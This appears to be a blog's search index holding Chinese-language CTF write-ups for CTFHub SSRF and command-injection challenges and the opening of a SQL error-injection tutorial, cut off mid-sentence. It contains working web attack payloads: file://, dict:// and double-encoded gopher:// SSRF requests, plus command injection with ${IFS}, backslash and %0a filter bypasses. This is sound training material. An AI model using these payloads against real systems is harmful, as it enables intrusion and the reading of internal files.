<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTFHub-SSRF</title>
      <link href="/2021/11/17/ssrf/"/>
      <url>/2021/11/17/ssrf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-SSRF"><a href="#CTFHub-SSRF" class="headerlink" title="CTFHub-SSRF"></a>CTFHub-SSRF</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;SSRF</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p><a href="https://www.bilibili.com/read/cv12733096">相关链接</a></p><blockquote><p><strong>SSRF</strong>(Server-side Request Forge, 服务端请求伪造)：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务，类型可分为有回显和无回显两种。</p></blockquote><blockquote><p><strong>例子</strong>：攻击者利用了可访问Web服务器（A）的特定功能 构造恶意payload；攻击者在访问A时，利用A的特定功能构造特殊payload，由A发起对内部网络中系统B（内网隔离，外部不可访问）的请求，从而获取敏感信息。此时A被作为中间人（跳板）进行利用。<strong>其实意思就是利用服务器A来对内部网络中的系统B发起请求。</strong><a href="https://www.freebuf.com/articles/web/258365.html">相关链接</a></p></blockquote><blockquote><p><strong>漏洞产生原因</strong>：服务端提供从其他服务器应用获取数据的功能，却没有对地址和协议做过滤，导致可利用此功能攻击服务端本机或所在内网。</p></blockquote><blockquote><p><strong>漏洞危害</strong>：探测内网信息、攻击内网应用</p></blockquote><blockquote><p><strong>常见场景</strong>：云服务商操作数据库、远程图片加载、网站采集抓取、头像、让你输入网址和ip的地方、webmail收发其他邮箱邮件、转码服务、在线翻译、收藏功能等。</p></blockquote><blockquote><p><strong>漏洞利用常用协议</strong>：file、http(s)、dict、gopher</p></blockquote><p>所以在做题目之前我们需要先<strong>简单了解</strong>在SSRF当中最常使用的四种URL伪协议，然后我们通过做题来理解怎么使用。</p><h2 id="四种URL伪协议"><a href="#四种URL伪协议" class="headerlink" title="四种URL伪协议"></a>四种URL伪协议</h2><p><a href="https://zhuanlan.zhihu.com/p/115222529">相关链接</a></p><h3 id="file"><a href="#file" class="headerlink" title="file:///"></a>file:///</h3><p>该伪协议可以从文件系统中获取文件，file协议的格式为：file:///文件路径</p><h3 id="dict"><a href="#dict" class="headerlink" title="dict://"></a>dict://</h3><p>词典网络协议。通过dict协议，可以探测端口的开放情况和指纹信息。dict协议的格式为：dict://ip地址:port端口</p><h3 id="http-s"><a href="#http-s" class="headerlink" title="http(s)://"></a>http(s)://</h3><p>这个协议其实非常常见，一般加在url前面的，向目标发送http请求。</p><div class="note green icon simple"><i class="note-icon fas fa-thumbs-up"></i><p><strong>file协议和http协议的区别：</strong></p><ul><li>file协议主要用于读取服务器本地文件，访问的是本地的静态资源</li><li>http是访问本地的html文件，相当于把本机当作http服务器，通过http访问服务器，服务器再去访问本地资源。简单来说file只能静态读取，http可以动态解析</li><li>http服务器可以开放端口，让他人通过http访问服务器资源，但file不可以</li><li>file对应的类似http的协议是ftp协议（文件传输协议）</li><li>file不能跨域</li></ul></div><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher://"></a>gopher://</h3><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引。需要发送多行数据时，就要用到gopher协议。gopher协议使用限制如下：</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172051862.png" alt="image-20211117205137796"></p><p><strong>gopher协议支持发出GET、POST请求</strong>：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p><strong>Gopher协议格式：</strong></p><p>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</p><p><strong>gopher的默认端口是70如果发起post请求，回车换行需要使用%0d%0a</strong>，如果多个参数，参数之间的&amp;也需要进行URL编码</p><p><strong>所以总的来说，gopher可以构造很多种不同类型的请求</strong>，下面的题目会利用gopher构造post请求。</p><p>Gopher牛逼！！！</p><h2 id="CTFHub-SSRF系列wp"><a href="#CTFHub-SSRF系列wp" class="headerlink" title="CTFHub-SSRF系列wp"></a>CTFHub-SSRF系列wp</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>看到题目：内网访问。然后再看题目描述：尝试访问位于127.0.0.1的flag.php吧</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172006588.png" alt="image-20211117200640184"></p><p>然后我们开启题目，点击网址之后的url栏是这样的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172008338.png" alt="image-20211117200853279"></p><p>这里有一个名为”url”的参数，既然题目说了127.0.0.1中有一个flag.php，那我们就把”url=”后面的”_”替换成”127.0.0.1/flag.php”,拿到flag</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p>这题还蛮简单的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172010988.png" alt="image-20211117201040928"></p><p>如果想要更规范的表达，那就加个http</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181343298.png" alt="image-20211118134316693"></p><h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>题目：伪协议读取文件。题目描述：尝试去读取一下Web目录下的flag.php吧</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172018092.png" alt="image-20211117201855010"></p><p>由题可知，flag.php放在web的目录下，那默认apache的web目录路径为/var/www/html/</p><p>并且file伪协议可以从文件系统中获取文件，所以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php      //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172034893.png" alt="image-20211117203421808"></p><p>???</p><p>不慌，我们看一下源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-2faad2126ffe77a6.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172034612.png" alt="image-20211117203414561"></p><p>拿到flag</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>查看题目：端口扫描。题目描述：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172036472.png" alt="image-20211117203617368"></p><p>如题可知，我们需要从端口8000~9000中间找到对的端口，拿到flag。</p><p>这里我们直接用burpsuite进行抓包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1:8000       //url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172139888.png" alt="image-20211117213950803"></p><p>抓到包之后把数据包传到测试器Intruder</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172140501.png" alt="image-20211117214035422"></p><p>然后为127.0.0.1:8000中的8000添加成一个payload</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172142521.png" alt="image-20211117214254436"></p><p>然后设置载荷集，从8000开始，逐一递增至9000结束。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172144272.png" alt="image-20211117214429184"></p><p>然后得到一个返回包长度不一样的即为我们想要的端口号，里面存有flag</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111172146999.png" alt="image-20211117214651915"></p><p>这里也可以用dict来探测端口的指纹信息，根据长度不同也可以判断出有flag(这里我重置了一下环境，所以扫到的flag的端口换了一下)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181351434.png" alt="image-20211118135135337"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181352534.png" alt="image-20211118135205424"></p><p>去google浏览器中文翻译一下</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181353105.png" alt="image-20211118135321027"></p><p>可以看到端口8526有开启apache的web服务，上面是指纹信息，不过这里看不到flag，要把”dict://“去掉或者换成”http://“来访问该端口，即可得到flag，dict只是用来探测端口的开放情况。</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>题目：POST请求。题目描述：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181433028.png" alt="image-20211118143358925"></p><p>描述中说要发一个POST请求，而且又提到了curl。百度了一下，curl是支持gopher协议的，而且gopher可以发送POST请求，所以可能是利用gopher来解题。(这题网上说302.php被删掉了，而且后面扫描web目录的时候确实没发现302.php，所以就不管这个302.php了)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181441578.png" alt="image-20211118144142496"></p><p>进入题目之后，网页一片空白，源代码也没有什么东西。那首先我们先用”127.0.0.1”替换掉”_”，然后用dirsearch扫一下web目录</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181445026.png" alt="image-20211118144508939"></p><p>然后发现了两个东西：index.php和flag.php，而index.php是默认主页，被重定向到/?url=_，也就是我们一开始点进去的默认网页。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181448480.png" alt="image-20211118144858403"></p><p>那我们访问一下flag.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php//url后面的url参数</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181450589.png" alt="image-20211118145000498"></p><p>发现有一个输入框，然后我们看到源码有个注释：”key=98e7725c8992ee446316ea02eff8ff0f”</p><p>大概可以想到，我们需要提交一个POST请求，带上”key=98e7725c8992ee446316ea02eff8ff0f”参数</p><p>所以现在我们要做的是：</p><ul><li><p>gopher协议格式：URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流(这个下划线”_“是因为gopher协议会吃掉第一个字符，所以要先放一个没有用的字符，什么字符都行)</p></li><li><p>构造标准的POST请求</p></li><li><p>对请求进行URL编码，并且回车换行需要把%0A改成%0D%0A(gopher协议格式)</p></li><li><p>然后对已经URL编码后的请求再进行一次URL编码(<strong>因为在PHP接收到参数后会做一次URL的解码，%20等字符已经被转码为空格，而发起gopher时需要用的是URL编码的值，但是现在已经被解码回原来的样子，所以这里我们进行两次URL编码的目的是，抵消掉PHP接收到参数后的一次解码，这样使用gopher协议的时候就会用到一次URL编码的值</strong>，<a href="https://baijiahao.baidu.com/s?id=1666024412704315446">相关链接</a>，而且如果有两个”?”，说明会多一次跳转，有两个URL解码的过程，这时候就要进行三次URL编码了，<a href="https://blog.csdn.net/rfrder/article/details/108589988">相关链接</a>)</p></li><li><p>根据gopher协议格式，把编码后的请求内容粘贴到TCP数据流的位置中</p></li></ul><p>所以我们先构造一个标准的POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=98e7725c8992ee446316ea02eff8ff0f</span><br></pre></td></tr></table></figure><p>其中，上面的四个参数：POST、Host、Content-Type、Content-Length是POST请求必须的，如果少了会报错，但是GET请求就不需要这么多。而且Content-Length应为字符串“key=98e7725c8992ee446316ea02eff8ff0f”的长度</p><p>然后在HackBar中对上述构造的POST请求进行URL编码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181457623.png" alt="image-20211118145716511"></p><p>注意编码后要在每个%0A前面添加%0D</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181539451.png" alt="image-20211118153954391"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">POST%</span><span class="bash">20%2fflag.php%20HTTP%2f1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Type:%20application%2fx-www-form-urlencoded%0D%0AContent-Length:%2036%0D%0A%0D%0Akey=98e7725c8992ee446316ea02eff8ff0f</span></span><br></pre></td></tr></table></figure><p>然后再把上述编码后的POST请求再进行一次URL编码，得到如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">POST%</span><span class="bash">2520%252fflag.php%2520HTTP%252f1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application%252fx-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=98e7725c8992ee446316ea02eff8ff0f</span></span><br></pre></td></tr></table></figure><p>然后就可以通过gopher协议的格式，在url栏提交POST请求</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-5eeccc951ae08152.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520%252fflag.php%2520HTTP%252f1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Type:%2520application%252fx-www-form-urlencoded%250D%250AContent-Length:%252036%250D%250A%250D%250Akey=98e7725c8992ee446316ea02eff8ff0f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181513272.png" alt="image-20211118151339193"></p><p>flag就出来了，当然也可以通过burpsuite先抓到普通的包，然后修改GET后面的内容</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181513384.png" alt="image-20211118151306270"></p><p>注意这里得到的是一个假flag，而且上面提示重启题目环境，这是一个假的网页，因为我搞错了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111181517170.png" alt="image-20211118151746087"></p><p>这才是真正的flag和网页。。所以做题一定要注意！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTFHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub-RCE</title>
      <link href="/2021/11/15/rce/"/>
      <url>/2021/11/15/rce/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFHub-RCE"><a href="#CTFHub-RCE" class="headerlink" title="CTFHub-RCE"></a>CTFHub-RCE</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>题目位置：CTFHub-&gt;技能树-&gt;Web-&gt;RCE-&gt;命令注入</p></div><div class="note success disabled"><p><a href="https://www.ctfhub.com/">CTFHub官网</a></p></div><p>该篇文章主要是记录CTFHub中的RCE-命令注入的几道题目的解法</p><hr><h2 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h2><h3 id="一、命令注入"><a href="#一、命令注入" class="headerlink" title="一、命令注入"></a>一、命令注入</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151652485.png" alt="image-20211115165215333"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151659895.png" alt="image-20211115165932817"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151700760.png" alt="image-20211115170020703"></p><p>这里可以使用Linux的命令拼接。</p><p><a href="https://blog.csdn.net/weixin_43326436/article/details/106719844">相关链接</a></p><p><a href="https://blog.csdn.net/JBlock/article/details/88311388">相关链接</a></p><p>LINUX系统的管道符:</p><ol><li>“ ; “: 执行完前面的语句在执行后面的语句。</li><li>“ | “: 显示后面的语句的执行结果。</li><li>” || “：当前的语句执行出错时，执行后面的语句。</li><li>” &amp; “：两条命令都执行，如果前面语句为假则执行后面的语句，前面的语句可真可假。放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job(没看懂)</li><li>” &amp;&amp; “：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则执行两条命令，前面的语句只能为真。</li></ol><p>这里可以使用”&amp;”、”|”、”||”或者”;”</p><p>这里我们使用分号”;”来拼接指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151712717.png" alt="image-20211115171211662"></p><p>发现有个24583193744971.php文件，用cat进行查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat 24583193744971.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151713501.png" alt="image-20211115171301428"></p><p>发现什么都没有显示，如果不是cat过滤了的话那就是24583193744971.php文件内容里面有注释符什么的，导致在html页面中无法正常显示里面的内容，此时查看源码。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151715541.png" alt="image-20211115171503458"></p><p>发现flag。</p><p>也可以使用base64和管道符”|”来把内容变成base64，然后利用base64解码，来解出文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat 24583193744971.php | base64</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151717362.png" alt="image-20211115171720268"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151717086.png" alt="image-20211115171734993"></p><p>得到flag</p><hr><h3 id="二、过滤cat"><a href="#二、过滤cat" class="headerlink" title="二、过滤cat"></a>二、过滤cat</h3><p><a href="https://blog.csdn.net/szgyunyun/article/details/104970118">相关链接</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151943529.png" alt="image-20211115194303434"></p><p>思路：代替cat</p><blockquote><p>cat 由第一行开始显示内容，并将所有内容输出</p><p>tac 从最后一行倒序显示内容，并将所有内容输出</p><p>more 根据窗口大小，一页一页的现实文件内容</p><p>less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</p><p>head 只显示头几行</p><p>tail 只显示最后几行</p><p>nl 类似于cat -n，显示时输出行号</p><p>tailf 类似于tail -f</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151722727.png" alt="image-20211115172236635"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;head flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151723660.png" alt="image-20211115172310562"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151723874.png" alt="image-20211115172316809"></p><p>用ca\t也可以绕过(我丢，这是为啥啊)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ca\t flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151938832.png" alt="image-20211115193832734"></p><p>同样源代码可以看到flag</p><hr><h3 id="三、过滤空格"><a href="#三、过滤空格" class="headerlink" title="三、过滤空格"></a>三、过滤空格</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151940961.png" alt="image-20211115194032853"></p><p>通常我们可以用&lt;,&lt;&gt;, ${IFS},  $IFS，%20(space),  %09(tab),  $IFS$9来替代空格(该小题下面讲述IFS的意思)</p><p>测试了一下，这题&lt;&gt;,%20,%09不能用，其它都可以</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat&lt;flag文件名</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151944627.png" alt="image-20211115194437540"></p><p>同样查看源码即可获得flag</p><p>而如果在sql注入中，绕过过滤空格的话则通常利用注释/**/来绕过。(当然还有其他方法，%20什么的)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select user() from dual</span><br><span class="line"></span><br><span class="line">select/**/user()/**/from/**/dual</span><br></pre></td></tr></table></figure><hr><p>IFS在linux中表示 Internal Field Separator （内部字段分隔符）</p><p>$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）</p><p>例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS=:  //定义内部字段分隔符为: 默认为空格</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a=Hello:World</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="variable">$a</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;Hello World//a变量中的:被指定为了内部字段分隔符，所以变成空格</span></span><br></pre></td></tr></table></figure><p>假如需要迭代一个字符串或csv（Comma Separtor value，逗号分隔型数值）中的单词。</p><p>对于字符串，定界符IFS一般用“.”。而csv文件，定界符IFS一般用”,“。</p><p>当IFS被设置为逗号时，shell将逗号解释成一个定界符，因此变量$item在每次迭代时读取由逗号分隔的字符串作为变量值。</p><hr><h3 id="四、过滤目录分隔符"><a href="#四、过滤目录分隔符" class="headerlink" title="四、过滤目录分隔符"></a>四、过滤目录分隔符</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151956943.png" alt="image-20211115195602861"></p><p>看代码可以知道，已经把”/“和”\“过滤掉了</p><p>先查看文件夹名字</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111151956255.png" alt="image-20211115195646165"></p><p>flag应该放在flag_is_here文件夹下面，首先我们可以利用拼接指令的方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;ls      //查看文件夹中的文件</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152000144.png" alt="image-20211115200038079"></p><p>果然有个文件叫flag_297861214225622.php，接下来老样子，用cat查看文件内容然后查看源码就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cd flag_is_here;cat flag_297861214225622.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152002576.png" alt="image-20211115200200499"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152002841.png" alt="image-20211115200207780"></p><p>拿到flag</p><hr><h3 id="五、过滤运算符"><a href="#五、过滤运算符" class="headerlink" title="五、过滤运算符"></a>五、过滤运算符</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152005664.png" alt="image-20211115200540577"></p><p>过滤了这么多运算符…但是没什么卵用。老样子，用分号”;”来拼接就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls</span><br><span class="line"></span><br><span class="line">127.0.0.1;cat flag文件名</span><br></pre></td></tr></table></figure><p>这里就不上图了</p><p>还有一种方法是之前的file | base64写成base64 file，输出base64编码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;base64 flag文件名</span><br></pre></td></tr></table></figure><hr><h3 id="六、综合过滤练习"><a href="#六、综合过滤练习" class="headerlink" title="六、综合过滤练习"></a>六、综合过滤练习</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152029525.png" alt="image-20211115202906438"></p><p>看题可知，该题目过滤了”|”，”&amp;”，”;”，” “，”/“，”cat”,”flag”,”ctfhub”</p><p>我们空格可以用$(IFS)，这里用&gt;不行，其它的没试</p><p>cat用head(其它的也行)</p><p>flag用正则表达式f***，fl$*ag也可以(不知道啥意思)，很多种方法</p><p>linux下命令分隔符除了”;”，还能用%0a,%0d,%0D%0A替代(注意这是url编码后的符号，所以我们要用burpsuite抓完包之后把需要分隔符的地方修改成%0a，或者在url地址栏中填写，以下使用burpsuite方便一点)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls</span><br></pre></td></tr></table></figure><p>提交之后burpsuite抓包，然后发到重发器，修改&amp;的url编码%26为%0a</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152044446.png" alt="image-20211115204435331"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152045233.png" alt="image-20211115204516111"></p><p>右边就会显示文件夹的名字了，如果是在浏览器上</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152054756.png" alt="image-20211115205446668"></p><p>然后我们通过${IFS}代表空格，正则表达式f***_is_here匹配到flag_is_here，回显文件名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0als</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152047746.png" alt="image-20211115204715610"></p><p>用head代替cat，f***_8938535132164.php代替flag_8938535132164.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0acd$&#123;IFS&#125;f***_is_here%0ahead$&#123;IFS&#125;f***_8938535132164.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202111152050630.png" alt="image-20211115205034523"></p><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTFHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL-报错注入</title>
      <link href="/2021/10/11/sql-error-inject/"/>
      <url>/2021/10/11/sql-error-inject/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL-报错注入"><a href="#SQL-报错注入" class="headerlink" title="SQL-报错注入"></a>SQL-报错注入</h1><p>当把sql语句带入查询之后，返回的页面正确，但是没有返回点时，用echo mysql_error()在页面输出错误信息。</p><div class="note warning simple"><p>报错注入速度比较快，但是floor()不能用group_concat()一次性输出数据库名、表名或字段名,只能用limit，下面演示的时候会提到</p><p>高版本的MYSQL8.*已经修复了报错注入这个bug，所以此SQL报错注入只适用于MYSQL5.*</p></div><h2 id="常用三种报错注入"><a href="#常用三种报错注入" class="headerlink" title="常用三种报错注入"></a>常用三种报错注入</h2><ul><li>floor()</li><li>updatexml()</li><li>extractvalue()</li></ul><blockquote><p>该篇主要先讲SQL报错注入时常用的几个函数和SQL语句的原理以及使用。最后利用floor()、updatexml()、extractvalue()对CTFHub上的题目进行报错注入。因为篇幅较长，所以不会讲SQL手工注入基本语句的大概意思，只会讲SQL-报错注入的原理和利用，然后演示一遍。如果看不懂手工注入基本语句，请自行Google</p></blockquote><blockquote><p>MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是updatexml()和extractvalue()</p></blockquote><hr><h2 id="函数解析及floor"><a href="#函数解析及floor" class="headerlink" title="函数解析及floor()"></a>函数解析及floor()</h2><p>在讲floor()函数的同时，还要简单讲一下三个SQL函数和语句：count(*)、rand()、group by。然后updatexml()和extractvalue()函数的解析后面做题的时候再作解释，也可直接在右边目录中直接跳到想要看的函数解析。</p><blockquote><p>count(*)</p><p>返回在给定的选择中被选的行数。</p></blockquote><blockquote><p>rand()/rand(0)</p><p>rand()</p><p>产生0~1的随机数，所以rand()*2就是产生0~2的随机数，没有规律。</p><p>rand(0)</p><p>函数中加了随机因子之后，就变成了伪随机数，也就是有规律地产生随机数。rand(0)*2就是产生0~2的有规律的随机数。</p></blockquote><blockquote><p>concat()</p><p>连接参数产生的字符串,如有任何一个参数为NULL ,则返回值为 